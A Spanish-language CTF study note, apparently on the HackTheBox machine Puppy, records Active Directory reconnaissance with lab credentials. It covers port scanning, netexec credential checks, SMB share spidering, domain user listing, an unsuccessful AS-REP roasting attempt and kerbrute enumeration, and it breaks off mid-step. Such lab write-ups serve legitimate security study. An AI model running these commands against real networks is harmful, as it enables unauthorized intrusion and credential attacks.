levi.james / KingofAkron2025!
## Reconocimiento
`rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sCV -oG allPorts`

*Puertos*
`53/DNS`
`88/kerberos`
`111/rpcbind`
`389/LDAP`
`445/SMB`
`5985/WinRm`


`netexec ldap $IP 2>/dev/null` 
`LDAP 10.10.11.70 389 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)`

`iRealm --force $IP PUPPY.HTB DC`
Nos añade la maquina a `/etc/hosts` y nos añade el nombre del dominio y FQDN a `/etc/krb5.conf`

Verificamos las credenciales son validas con [[CRACKMAPEXEC-NETEXEC]]
`nxc ldap $IP -u 'levi.james' -p 'KingofAkron2025!'` si sale en verde es que las credenciales son validas

Buscamos recursos compartidos con [[CRACKMAPEXEC-NETEXEC]]
`nxc smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares  -M spider_plus`

Nos genera un archivo `.JSON` en `/root/.nxc/modules/nxc_spider_plus/10.10.11.70.json`

Enumerar usuarios del dominio con [[CRACKMAPEXEC-NETEXEC]] 
`nxc ldap $IP -u 'levi.james' -p 'KingofAkron2025!' --users`
```     
Administrator    
Guest            
krbtgt           
levi.james       
ant.edwards      
adam.silver      
jamie.williams   
steph.cooper     
steph.cooper_adm 
```

Usaremos el ataque de AS-REP ROASTING con [[IMPACKET]]
`impacket-GetNPUsers -no-pass -usersfile users.txt puppy.htb/`
No es susceptible al ataque.

Enumeracion de usuarios y verifica que exista en el dominio [[KERBRUTE]]
`kerbrute userenum --dc $IP -d puppy.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames`

 O también podemos usar [[CRACKMAPEXEC-NETEXEC]]
 ``









